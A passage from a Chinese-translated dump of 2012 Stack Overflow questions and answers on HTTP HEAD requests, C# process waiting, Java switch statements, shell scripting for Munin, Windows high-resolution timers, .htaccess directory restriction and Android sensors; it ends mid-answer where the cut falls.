## 回答 #2

> 赞同：3
> 
> 时间：2012-09-26T14:34:10.143

您看到的问题与 Python 无关。该网站本身似乎需要的不仅仅是 HEAD 请求。即使是简单的 telnet 会话也会导致错误：

```
$ telnet www.nativeseeds.org 80
Trying 208.113.230.85...
Connected to www.nativeseeds.org (208.113.230.85).
Escape character is '^]'.
HEAD / HTTP/1.1
Host: www.nativeseeds.org

HTTP/1.1 503 Service Temporarily Unavailable
Date: Wed, 26 Sep 2012 14:29:33 GMT
Server: Apache
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=iso-8859-1 
```

尝试添加更多标题；命令行`http`客户端确实收到 200 响应：

```
$ http -v head http://www.nativeseeds.org
HEAD / HTTP/1.1
Host: www.nativeseeds.org
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Accept-Encoding: identity, deflate, compress, gzip
Accept: */*
User-Agent: HTTPie/0.2.2

HTTP/1.1 200 OK
Date: Wed, 26 Sep 2012 14:33:21 GMT
Server: Apache
P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"
Expires: Mon, 1 Jan 2001 00:00:00 GMT
Cache-Control: post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: f65129b0cd2c5e10c387f919ac90ad66=34hOijDSzeskKYtULx9V83; path=/
Last-Modified: Wed, 26 Sep 2012 14:33:23 GMT
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 20
Content-Type: text/html; charset=utf-8 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T14:41:15.560

[阅读 urllib2 文档](http://docs.python.org/library/urllib2.html)，get_method 只返回 'GET' 或 'POST'。

[你可能对此感兴趣。](https://stackoverflow.com/questions/107405/how-do-you-send-a-head-http-request-in-python)

# templates - Visual Studio 中的 Dreamweaver 模板

> ID：12603810
> 
> 赞同：1
> 
> 时间：2012-09-26T14:18:47.257
> 
> 标签：templates, dreamweaver

我们有一些带有 Dreamweaver 模板的经典 ASP 站点。我们现在想使用 Visual Studio（和 tfs）来维护这些站点。有什么方法可以防止模板可编辑（或以其他方式标记，以免它们被破坏）？

# c# - 设置进程退出的等待时间

> ID：12603811
> 
> 赞同：0
> 
> 时间：2012-09-26T14:18:47.177
> 
> 标签：c#, .net, batch-file

我正在使用以下命令来运行 bat 文件：

```
Process p = new Process();
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = false;
p.StartInfo.FileName = "d:/my.bat";
p.Start();
p.WaitForExit(2000000);               
p.Close();
p.Dispose(); 
```

我的问题是我需要等到上述过程完成并尽快关闭它。

有什么建议么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-26T14:22:53.880

您可以替换`p.WaitForExit(2000000)`为`p.WaitForExit();`以管理进程运行时间超过 2000000 毫秒的情况。

[关联](http://msdn.microsoft.com/fr-fr/library/system.diagnostics.process.waitforexit%28v=vs.80%29.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T14:23:38.073

只需使用`WaitForExit`没有任何参数，如：

```
Process p = new Process();
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = false;
p.StartInfo.FileName = "d:/my.bat";
p.Start();
p.WaitForExit();
p.Close();
p.Dispose(); 
```

它将等到您的过程完成。有关详细信息，请参阅[MSDN 上的文档](http://msdn.microsoft.com/en-us/library/fb4aw7b8.aspx)。

或者，特别是如果您想向用户提供反馈，您可以执行以下操作：

```
Process p = new Process();
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = false;
p.StartInfo.FileName = "d:/my.bat";
Console.Write("Running {0} ", p.StartInfo.FileName)
p.Start();
while (!p.HasExited)
{
    Console.Write(".");
    // wait one second
    Thread.Sleep(1000);
}
Console.WriteLine(" done.");
p.Close();
p.Dispose(); 
```

# javascript - IE 的 Object.defineProperty

> ID：12603812
> 
> 赞同：1
> 
> 时间：2012-09-26T14:18:50.273
> 
> 标签：javascript

```
var o = {}; // Creates a new object 
```

`defineProperty`添加了数据属性描述符的对象属性示例

```
Object.defineProperty(o, "a", {value : 37,
                               writable : true,
                               enumerable : true,
                               configurable : true}); 
```

如何为 IE7-8 实现？（具有可写、可枚举、可配置的属性）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-09-19T01:24:39.970

```
if (!Object.defineProperty) {
        Object.defineProperty = function (obj, prop, descriptor) {
            if (arguments.length < 3) { // all arguments required
                throw new TypeError("Arguments not optional");
            }

            prop += ""; // convert prop to string
            ... 
```

# java - 将视频添加到节目的季节？

> ID：12603813
> 
> 赞同：1
> 
> 时间：2012-09-26T14:18:52.340
> 
> 标签：java, php, javascript, .net, youtube-api

有人知道这在 YouTube API 中是否可用吗？我很确定您可以检索节目的提要，但我不知道如何使用 .Net（或任何其他）API 将视频添加到季节。

基本上，我所做的一切都围绕播放列表。我将 vids 添加到播放列表，然后使用 API 运行每个视频以更新描述和标签，添加视频响应，我想同时将这些视频添加到相应节目的季节中。能够自动执行该过程可以节省大量时间。

我缺少的部分是如何将视频添加到节目的特定季节。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T16:58:03.970

公共 GData API 中没有任何内容允许您修改节目的元数据。

# node.js - 如何在猫鼬查询中使用 if 语句？

> ID：12603815
> 
> 赞同：2
> 
> 时间：2012-09-26T14:18:51.957
> 
> 标签：node.js, mongodb, mongoose

我有一个名为 Feed 的 mongodb 集合，它有一个名为“type”的属性。根据那个字符串，我想用 json 发送一个可变字段。例如，如果类型是“照片”，我想做这样的事情

```
 schema.find({number: "123456"},"body number",
 function(err, data) { 
```

但如果字符串是故事，而不是照片；在相同的“schema.find”查询中，它应该使用“body url”而不是“body number”创建一个 json。并且它们都应该使用相同的 json 传递。

```
 res.json(data); 
```

举一个明显的例子，我希望我的 json 是这样的。当您看到字段根据“类型”而变化时。但它们实际上都在同一个集合中。

```
[
    {
        type: 'photo',
        number: 123456,
        url: 'asd.jpg',

    },
    {
        type: 'story',
        body: 'hello',
        number: 123456,

    }
] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:55:57.190

因此，基本上您希望从 Feed 集合中返回某些文档字段，这些字段在诸如 eg 的变量中指定`"firstName pic points photos"`。

是否有带有该`story`字段的 Feed 文档？

[Model.find()](http://mongoosejs.com/docs/api.html#model_Model-find)不创建任何模式。

也许用进一步的代码进行编辑，以便我们可以理解该命令。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T17:54:56.540

看看[mongoose-schema-extend](https://github.com/briankircho/mongoose-schema-extend)。使用“鉴别器键”功能，您可以指示 .find() 在每种情况下创建正确的模型。

您的代码应如下所示（未经测试）：

```
var feedSchema = new Schema({
    venue: Number,
}, {discriminatorKey : 'type' }});

var photoSchema = feedSchema.extend({
    url: String
});
var storySchema = feedSchema.extend({
    body: String
});

var Feed= mongoose.model('feed', feedSchema );
var Photo= mongoose.model('photo', photoSchema );
var Story= mongoose.model('story', storySchema );
//'photo' and 'story' will be the values for 'type' key

Feed.find({venue: "123456"}, function(err, models) {
   console.log(models[0] instanceof Photo); // true
   console.log(models[0] instanceof Story); // false

   console.log(models[1] instanceof Photo); // false
   console.log(models[1] instanceof Story); // true
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T16:12:57.257

对于像这样的特定于文档的 JSON 格式，您可以覆盖模型的默认`toJSON`方法，`Feed`如[本要点](https://gist.github.com/1589265)所示。

**更新**

如果您希望文档具有这种灵活性，那就更容易了。只需定义您的架构以包含所有可能的字段，然后仅设置适用于给定文档的字段`type`。您不使用的字段不会出现在文档中（或 JSON 响应中）。所以你的架构看起来像：

```
var feedSchema = new Schema({
    type: { type: 'String' },
    venue: Number,
    url: String,
    body: String
}); 
```

# css - 绝对定位的重复背景不会拉伸以填充页面

> ID：12603816
> 
> 赞同：0
> 
> 时间：2012-09-26T14:18:53.673
> 
> 标签：css, background

> **可能重复：**
> [获取 CSS Div 以填充可用高度](https://stackoverflow.com/questions/2297453/get-css-div-to-fill-available-height)

基本上我有一个CSS设置如下：

```
 body {
        font-family: "Open Sans", Arial, sans-serif;
        background: url(images/body-background-gradient.png) repeat-x #343434;
        text-align: center;
    }
    #background-tile {
        background: url(images/body-background-tile.png) repeat;
        width: 100%;
        min-height: 100%;
        height: auto;
        position: absolute;
        left: 0;
        top: 0;
        z-index: -2;
    } 
```

HTML：

```
<body>
    <div id="background-tile"></div>
        ...
</body> 
```

主体具有水平重复的背景渐变。我在正文中有一个空的 div (#background-tile)，它充当叠加背景 - 只是一个重复的 2x2 像素方形图案。

问题是当页面拉伸到超过浏览器的高度时，平铺图案不会继续填充背景的其余部分，所以我最终在页面底部有一个没有平铺背景的部分 -只是灰色的背景。我做了很多搜索，但找不到可行的解决方案。

截图：http: [//i46.tinypic.com/9i94xf.png](http://i46.tinypic.com/9i94xf.png)

非常感谢任何帮助。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T15:47:56.147

尝试给出`body`的位置`relative`和`.background-tile`高度`100%`（并摆脱`min-height`）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:22:36.440

删除这个

```
width: 100%;
        min-height: 100%;
        height: auto; 
```

它将尺寸设置为您正在使用的屏幕的高度......而不是整个网页。如果该代码与代码的任何其他部分相关，那么您可能需要找到解决方法。

# php - 使用 mpdf 将 php 文件转换为 pdf

> ID：12603817
> 
> 赞同：0
> 
> 时间：2012-09-26T14:18:56.333
> 
> 标签：php, pdf, mpdf

我可以将 html 页面转换为 pdf 并通过电子邮件发送没有任何问题，但是我在将 php 文件转换为 pdf 时遇到了麻烦。

是否可以使用 mpdf 将 php 文件转换为 pdf 或者我是否需要为此使用其他一些 php 类？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:33:06.090

该选项似乎是，首先将php文件的输出转换为html文件，保存并将该文件传递给mpdf。

认为我的解决方案可能看起来不同，但它对我来说效果很好。

否则这个[**链接**](http://www.binarytides.com/create-pdf-documents-from-html-using-mpdf-in-php/)

```
<?php
$file = '/home/user/Desktop/myfile.html';
$result = file_get_contents("url/of/ur/page");
echo $result; //view source now
file_put_contents($file, $result);
?> 
```

现在您可以将此文件传递给 mpdf。Realie sorie bt 我到目前为止还没有使用过 mpdf。可能这个解决方案适合你。

此外，其他选项是 curl。

# java - 在 Switch 语句中使用整数

> ID：12603824
> 
> 赞同：11
> 
> 时间：2012-09-26T14:19:16.190
> 
> 标签：java, switch-statement

出于各种商业原因，我想在我的一个类中保存一些静态 ID。它们最初是`int`，但我想将它们更改为`Integer`这样我可以对它们做一个 equals （即`MY_ID.equals(..)`避免 NPE）

当我将它们更改为 Integer 时，我的 switch 语句中出现错误。[文档](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/switch.html)说 Integer 在 Switches 中应该没问题。

去引用

> [Switch] 也适用于枚举类型（在 Enum Types 中讨论）、String 类和一些包装某些基本类型的特殊类：Character、Byte、Short 和 Integer（在 Numbers 和 Strings 中讨论）。

在我下面的代码中，如果 i 是 a`int`那么它会编译。当它是 a 时，`Integer`它不会说 a `constant expression is required`。我试过这样做`.intValue()`，但这也不起作用。

我真的很傻吗？还是完全误读了[文档](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/switch.html)？

```
private static final Integer i = 1;

@Test
public void test() {
    switch(mObj.getId()){
        case i: //do something
        default: //do something default
    }

} 
```

感谢这里的任何指示。暂时我将它们保持原样`int`并做`new Integer(myint).equals(...)`

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-26T14:22:00.917

将常量更改为原始类型：

```
private static final int i = 1; 
```

你会没事的。`switch`只能使用原语、枚举值和（从 Java 7 开始）字符串。几个小贴士：

*   `new Integer(myint).equals(...)`可能是多余的。如果至少有一个变量是原始的，只需执行：`myint == ...`。仅在与包装器`equals()`比较时才需要。`Integer`

*   更喜欢`Integer.valueOf(myInt)`而不是`new Integer(myInt)`- 并尽可能依赖自动装箱。

*   常量通常在 Java 中使用大写字母编写，因此`static final int I = 1`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-26T14:22:51.490

Switch[需要](http://docs.oracle.com/javase/specs/jls/se7/html/jls-14.html#jls-14.11)语句中的常量表达式`case`或枚举常量。[一个常量表达式是](http://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.28)：

> 表示原始类型值的表达式或未突然完成的字符串

所以整数不符合条件。在您的情况下，您可以使用一个`int`或一个枚举（如果您的 ID 在编译时已知，这将是有意义的）。

唯一可以使用盒装类型（例如 Integer）的地方是 switch 表达式：

```
switch(Integer.valueOf(1)) {
    case 1: //
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-26T14:28:13.827

既然 java 提供了枚举，我们通常会这样做：

```
public enum MyKey {
   i,
   j
}

...

switch(mObj.getId()){
    case i: //do something
    default: //do something default
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-01-26T18:13:37.823

因为我在看这个...

接受的答案说：

> switch 只能使用原语、枚举值和（从 Java 7 开始）字符串

然而，

[14.11 switch 语句](https://docs.oracle.com/javase/specs/jls/se7/html/jls-14.html#jls-14.11 "14.11 switch 语句")

概述了 switch 的 JavaSE7 文档，其中显示：

> 表达式的类型必须是 char、byte、short、int、**Character、Byte、Short、Integer**、String 或枚举类型（第 8.9 节），否则会发生编译时错误。

我只是想为未来的冲浪者澄清一下。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-26T14:27:43.687

您必须在 switch 语句中使用常量值。

```
switch(mObj.getId()){
    case 5: //do something
    default: //do something default
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-26T14:28:11.253

在显示的代码中，“i”是一个对象指针，而不是一个常量表达式。

# linux - shell脚本中的穆宁

> ID：12603826
> 
> 赞同：1
> 
> 时间：2012-09-26T14:19:22.930
> 
> 标签：linux, shell, arduino, munin

我想用 Munin 来显示我的数据波。我从 ttyACM0 获取数据，它是一个 Arduino UNO。我使用shell脚本。但是我遇到了一个问题，我无法使用“cat /dev/ttyACM0”来获取数据。这是问题所在，程序在'cat /dev/ttyACM0'处停止，

```
+ . /usr/share/munin/plugins/plugin.sh
+ '[' '' = autoconf ']'
+ '[' '' = config ']'
++ cat /dev/ttyACM0 
```

有时还有另一个问题，就是找不到 'LINE = $(cat /dev/ttyACM0 | awk -F: '{print $2}')' 命令。有人有想法吗？非常感谢。

这是我的代码的一部分，

```
if [ "$1" = "config" ]; then
    echo 'graph_title Temperature of board'
    echo 'graph_args --base 1000 -l 0'
    echo 'graph_vlabel temperature(°C)'
    echo 'graph_category temperature'
    echo 'graph_scale no'
    echo 'graph_period second'
    echo 'graph_info This graph shows the temperature of board'
    LINE = $(cat /dev/ttyACM0 | awk -F: '{print $2}')

    for i in 0 1 2 3 4; do
        case $i in
            1)
            TYPE="Under PCB"
            ;;
            2)
            TYPE="HDD"
            ;;
            3)
            TYPE="PHY"
            ;;
            4)
            TYPE="CPU"
            ;;
            5)
            TYPE="Ambience"
            ;;
        esac
        name=$(clean_name $TYPE)
        if ["$TYPE" != "NA"]; then 
            echo "temp_$name.label $TYPE";
        fi
    done
    exit 0
 fi

LINE = $(cat /dev/ttyACM0 | awk -F: '{print $2}')
for i in 0 1 2 3 4; do
    case $i in
        1)
        TYPE="Under PCB"
        VALUE=$(echo "$LINE" | awk '{print $1}')
        ;;
        2)
        TYPE="HDD"
        VALUE=$(echo "$LINE" | awk '{print $2}')
        ;;
        3)
        TYPE="PHY"
        VALUE=$(echo "$LINE" | awk '{print $3}')
        ;;
        4)
        TYPE="CPU"
        VALUE=$(echo "$LINE" | awk '{print $4}')
        ;;
        5)
        TYPE="Ambience"
        VALUE=$(echo "$LINE" | awk '{print $5}')
        ;;
    esac

    name=$(clean_name $TYPE)
    if ["$TYPE" != "NA"]; then
        echo "temp_$name.value $VALUE";
    fi
done 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T15:03:49.810

`=`删除标志两侧的空格。它们在变量赋值中是不允许的。

将其更改为：

```
LINE=$(cat /dev/ttyACM0 | awk -F: '{print $2}') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T15:04:17.200

LINE 错误的问题在于“=”字符周围有空格。一定是`LINE=...`。

如果`/dev/ttyACM0`是一个不指示 EOF 的设备，那么它将等待更多的读取，并且`awk`将等待一个永远不会出现的 EOF。你究竟期望`/dev/ttyACM0`生产什么？如果您`cat /dev/ttyACM0`在控制台上键入会发生什么？

进一步注意 cat 的无用用法。更好的使用

```
LINE=$(awk -F: '{print $2}' /dev/ttyACM0) 
```

你必须在其中添加空间，`if ["$TYPE" != "NA"]; then`这样它才会显示

```
if [ "$TYPE" != "NA" ]; then 
```

# c++ - 将mp4解码为原始帧windows c++

> ID：12603830
> 
> 赞同：3
> 
> 时间：2012-09-26T14:19:27.783
> 
> 标签：c++, windows, ffmpeg, mp4, libav

我正在尝试解码使用 mp4creator 库创建的 MP4 文件。我找不到真正适用于库的 ffmpeg 或 libav 示例，因为代码与示例不兼容。

我需要一种简单的方法来读取 mp4 文件并将其解码为原始音频和视频帧。也需要在 Windows 上工作。

如果有人可以将我指向一个工作且兼容的 ffmpeg/libav 库 + 也可以工作的示例源文件。

如果我能得到本教程中使用的库版本，那将是可行的，因为这个人似乎是唯一一个写过关于 FFMPEG 的像样教程的人（尽管是在一些古老的版本上） [http://dranger.com/ffmpeg/](http://dranger.com/ffmpeg/)

编辑：

在 ffmpeg 的最新版本中，我找到了名为：filtering_video.c 的示例，使用找到的补丁：http: [//ffmpeg.org/pipermail/ffmpeg-devel/2012-June/126587.html](http://ffmpeg.org/pipermail/ffmpeg-devel/2012-June/126587.html)我已经让程序做“某事” “它看起来很有效，所以我会进一步调查。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T10:23:27.057

编辑成问题：在最新版本的 ffmpeg 中，我找到了名为：filtering_video.c 的示例，使用找到的补丁：http: [//ffmpeg.org/pipermail/ffmpeg-devel/2012-June/126587.html](http://ffmpeg.org/pipermail/ffmpeg-devel/2012-June/126587.html)我得到了程序工作。使用此处描述的函数 avtoipl：[http](http://www.digipedia.pl/usenet/thread/16949/6806/) ://www.digipedia.pl/usenet/thread/16949/6806/ 我已经将数据转换为我可以显示的 opencv RGB 图像。

# data-structures - 实现不可变的、可增长的向量

> ID：12603833
> 
> 赞同：4
> 
> 时间：2012-09-26T14:20:06.013
> 
> 标签：data-structures, f#, clojure, functional-programming

我有兴趣在 F# 中实现持久（例如纯函数式、不可变等）、可增长的向量，以便它们可以在 .NET 框架中使用。我当前的实现是 Hash-Mapped Trie 的一个变体，是根据[Clojure 的 implementation](http://blog.higher-order.net/2009/02/01/understanding-clojures-persistentvector-implementation/)完成的。

我在使用此实现实现随机访问插入和删除（在随机索引处插入和删除元素）时遇到问题。是否有一些算法/修改可以有效地进行这些操作，或者我可以查看其他一些实现？

*澄清：*当我说“插入”和“删除”时，我的意思是，例如，给定列表`[1; 2; 3; 4]`，插入`500`in position`1`会给我`[1:500:2:3:4]`。我不是指`set`或`associate`操作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T15:13:15.667

[手指树](http://www.cs.au.dk/~gerth/slides/soda98.pdf)可能是您正在寻找的。有一个[Clojure 实现](https://github.com/clojure/data.finger-tree)可用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T18:25:12.207

不可变向量/列表通常通过仅允许在一端插入然后在另一端共享不可变数据来提供快速更新。如果您想做非头/尾插入，那么您实际上想要做的是改变集合的不可变末端。您必须在要插入的项目周围拆分向量，然后将其重新拼接在一起以创建一个新向量，并且您能够做到的最好的时间是*O(n)*时间。

不可变排序树的工作方式略有不同，但它们也不会让您在少于*O(n)*的时间内重新编号索引（键）。

基本上，如果有人发现了一种在不可变向量中支持随机访问插入的有效方法，那么主流函数式语言之一就会支持它——但是没有这样的已知数据结构或算法，所以没有这样的实现。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-26T19:17:09.607

唯一能做的就是拆分和加入。这对于 clojure 向量非常无效。这就是为什么 Phill Bagwell 实现了一个可以在 log(n) 中拆分和连接的持久向量。

你可能想看看这个视频：[http ://blip.tv/clojure/phill-bagwell-striving-to-make-things-simple-and-fast-5936145](http://blip.tv/clojure/phill-bagwell-striving-to-make-things-simple-and-fast-5936145)

或直接阅读他的论文：infoscience.epfl.ch/record/169879/files/RMTrees.pdf

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-26T17:07:55.130

移植 Haskell HAMT[库](http://hackage.haskell.org/packages/archive/unordered-containers/0.2.2.1/doc/html/src/Data-HashMap-Base.html#HashMap)？[插入操作](http://hackage.haskell.org/packages/archive/unordered-containers/0.2.2.1/doc/html/src/Data-HashMap-Base.html#insert)为*O(log n* )

# c++ - 我可以在 Windows 上的 c++ 上检索微秒或非常准确的毫秒吗？

> ID：12603837
> 
> 赞同：1
> 
> 时间：2012-09-26T14:20:16.680
> 
> 标签：c++, windows, time, timer

所以我做了一个游戏循环，使用`SDL_Delay`函数来限制`frames per second`，它看起来像这样：

```
//While the user hasn't qui

while( stateID != STATE_EXIT )
{
    //Start the frame timer
    fps.start();

    //Do state event handling
    currentState->handle_events();

    //Do state logic
    currentState->logic();

    //Change state if needed
    change_state();

    //Do state rendering
    currentState->render();

    //Update the screen
    if( SDL_Flip( screen ) == -1 )
    {
        return 1;    
    }

    //Cap the frame rate
    if( fps.get_ticks() < 1000 / FRAMES_PER_SECOND )
    {
        SDL_Delay( ( 1000 / FRAMES_PER_SECOND ) - fps.get_ticks() );
    }
} 
```

所以当我运行我的游戏时`60 frames per second`（我假设这是“眼帽”），我仍然可以看到滞后类型的运动，这意味着我看到帧独立出现，导致运动不流畅。
这是因为显然`SDL_Delay`功能不太准确，导致`+,- 15 milliseconds`帧之间的差异大于我想要的。
（所有这些只是我的假设）

所以我只是在寻找一个好的和准确的计时器来帮助我解决这个问题。

有什么建议么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T14:35:27.947

我认为[How to make thread sleep less than a ms on Windows中有一个类似的问题](https://stackoverflow.com/questions/85122/sleep-less-than-one-millisecond)

但作为一名游戏程序员，我并不依赖睡眠函数来管理帧率（它们采用的参数只是*最小值*）。我只是尽可能快地在屏幕上画东西。我的游戏循环中有一堆函数调用，然后我会跟踪调用它们的频率。例如，我经常检查输入（1000 次/秒）以使游戏响应更快，但我检查网络收件箱的速度不会超过 100 次/秒。

例如：

```
#define NW_CHECK_INTERVAL    10
#define INPUT_CHECK_INTERVAL  1
uint32_t last_nw_check = 0, last_input_check = 0;

while (game_running) {
    uint32_t now = SDL_GetTicks();

    if (now - last_nw_check > NW_CHECK_INTERVAL) {
        check_network();
        last_nw_check = now;
    }

    if (now - last_input_check > INPUT_CHECK_INTERVAL) {
        check_input();
        last_input_check = now;
    }

    check_video();

    // and so on...
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T14:33:31.207

为此使用 QueryPerformanceCounter / Frequency。

```
LARGE_INTEGER start, end, tps; //tps = ticks per second
QueryPerformanceFrequency( &tps );
QueryPerformanceCounter( &start );
QueryPerformanceCounter( &end );
int usPassed = (end.QuadPart - start.QuadPart) * 1000000 / tps.QuadPart; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-26T14:31:41.463

这是我为定时 MIDI 序列创建的一个小等待函数，使用`QueryPerformanceCounter`：

```
void wait(int waitTime) {
    LARGE_INTEGER time1, time2, freq;

    if(waitTime == 0)
        return;

    QueryPerformanceCounter(&time1);
    QueryPerformanceFrequency(&freq);

    do {
        QueryPerformanceCounter(&time2);
    } while((time2.QuadPart - time1.QuadPart) * 1000000ll / freq.QuadPart < waitTime);
} 
```

要将滴答声转换为微秒，请计算滴答声的差异，乘以 1,000,000（微秒/秒）并除以每秒滴答声的频率。

请注意，有些事情可能会导致这一点，例如高分辨率计数器的精度不太可能降至一微秒。例如，如果您要等待 10 微秒，并且精度/频率是每 6 微秒一个滴答声，那么您的 10 微秒等待实际上将不少于 12 微秒。同样，此频率取决于系统，并且会因系统而异。

此外，Windows 不是实时操作系统。进程可能随时被抢占，由 Windows 决定何时重新安排进程。应用程序可能会在此函数的中间被抢占，并且在预期的等待时间过去很久之后才会再次重新启动。你真的无能为力，但如果它发生，你可能永远不会注意到它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-26T15:44:51.637

SDL_延迟：

`This function waits a specified number of milliseconds before returning. It waits at least the specified time, but possible longer due to OS scheduling. The delay granularity is at least 10 ms. Some platforms have shorter clock ticks but this is the most common.`

使用此功能观察到的实际延迟取决于操作系统设置。我建议查看 Mutimemedia [Timer](http://msdn.microsoft.com/en-us/library/windows/desktop/dd743609%28v=vs.85%29.aspx) API，特别是[timeBeginPeriod](http://msdn.microsoft.com/en-us/library/windows/desktop/dd757624%28v=vs.85%29.aspx) 函数，以根据您的要求调整中断频率。

[获取和设置定时器分辨率](http://msdn.microsoft.com/en-us/library/windows/desktop/dd743626%28v=vs.85%29.aspx)显示了如何将中断周期更改为大约 1ms 的示例。这样你就不再有 15ms 的打嗝了。*BTW：醒目的周期约为 40 毫秒。*

获得固定周期计时也可以通过[等待定时器对象](http://msdn.microsoft.com/en-us/library/windows/desktop/ms687012%28v=vs.85%29.aspx)来解决。但是无论如何，必须使用多媒体计时器才能获得不错的分辨率。

[此处](https://stackoverflow.com/a/11537483/1504523)讨论了使用其他工具来提高计时功能。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-26T15:05:49.000

60 fame per second is just the frequency of power in US (50 in Europe, Africa and Asia are somehow mixed) and is the frequency of video refreshing for hardware comfortable reasons (It can be an integer multiple on more sophisticated monitors). It was a mandatory constrains for CRT dispaly, and it is still a comfortable reference for LCD (that's how frequently the frame buffer is uploaded to the display)

The eye-cap is no more than 20-25 fps - not to be confused with retina persistency, that's about one-half - and that's why TV interlace two squares upon every refresh.

independently on the timing accuracy, whatever hardware device cannot be updated during its buffer-scan (otherwise the image changes while it is shown, resulting in half-drawn broken frames), hence, if you go faster than one half of the device refresh you are queued behind it and forced to wait for it.

60 fps in a game loop serves only to help CPU manufacturers to sell new faster CPUs. Slow down under 25 and everything will look more fluid.

# php - 限制对子目录的访问，不允许httpd.conf访问，不想在根目录之外创建htaccess

> ID：12603839
> 
> 赞同：0
> 
> 时间：2012-09-26T14:20:25.243
> 
> 标签：php, apache, .htaccess, web-applications

我研究了很长时间，但找不到正确的答案。我正在使用由`000webhost.com`. 我有一个`.htaccess`由他们提供的 public_html 文件夹。目录结构有子目录，比如`includes`我不希望用户直接访问 URL，应该说`Forbidden - 403`.

我不想`.htaccess`在我不想允许访问的每个子目录中。我在某处读到 .htaccess 可以改变所有子目录及其本身的行为。

我知道性能方面这不是一个好选择，但我无权访问 httpd.conf。

我认为在 SO 上有一些答案告诉我：1\. 将这些子目录移到 public_html 之外（不想这样做） 2.`.htaccess`为每个子目录创建并拒绝访问（这是痛苦而不是可扩展的解决方案） 3.使用重写规则（可能是一个不确定的解决方案）我希望有人能理解并帮助我。

非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:27:35.227

实际上，最安全的解决方案是将这些目录移到 DocumentRoot 之外。但是，您可以轻松地在 .htaccess 中添加重写规则以禁止访问：

```
RewriteEngine On
# Group many forbidden directories as (a|b|c|d)
RewriteRule ^(include|otherforbidden|someotherone) - [F] 
```

除非您在下游有几十个目录要管理，否则我认为在每个目录中删除特定于目录的 .htaccess 不会有什么大问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:30:08.613

添加`RedirectMatch 403 ^/includes/.*$`到您的根`.htaccess`文件以将任何调用重定向到 /includes 目录以强制出现**403 Forbidden**错误。

但是，使用它会更安全，`RedirectMatch 404 ^/includes/.*$`因为攻击者会收到**404 File Not Found**错误。这被认为更安全，因为 403 错误让攻击者知道有要攻击的文件。

# android - Android：方向传感器在平板电脑上不起作用

> ID：12603844
> 
> 赞同：2
> 
> 时间：2012-09-26T14:20:45.707
> 
> 标签：android

Sensor.TYPE_ORIENTATION 在移动设备上运行良好，但在平板电脑上无法运行。

```
List<Sensor> mySensors = mySensorManager.getSensorList(Sensor.TYPE_ORIENTATION);

if(mySensors.size() > 0)
{
  Toast.makeText(this, "Start ORIENTATION Sensor", Toast.LENGTH_LONG).show();
}
else
{
  Toast.makeText(this, "No ORIENTATION Sensor", Toast.LENGTH_LONG).show();
} 
```

谁能帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:49:36.827

看起来`Sensor.TYPE_ORIENTATION`常量[已被弃用](http://developer.android.com/reference/android/hardware/Sensor.html#TYPE_ORIENTATION)。改为使用[`SensorManager.getOrientation()`](http://developer.android.com/reference/android/hardware/SensorManager.html#getOrientation%28float%5B%5D,%20float%5B%5D%29)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-19T10:04:55.710

我使用 SensorManager.getOrientation() 它也可以在手机中使用，但不能在平板电脑中使用。

```
float[] mGravity;
float[] mGeomagnetic;
float RR[] = new float[9];
float I[] = new float[9];
float orientation[] = new float[3];

SensorManager mSensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
Sensor mAccelerometer = mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
Sensor mMageneticField = mSensorManager.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD);

mSensorManager.registerListener(this,mAccelerometer,SensorManager.SENSOR_DELAY_NORMAL);
mSensorManager.registerListener(this,mMageneticField,SensorManager.SENSOR_DELAY_NORMAL); 
```

// onSensorChanged 内部

```
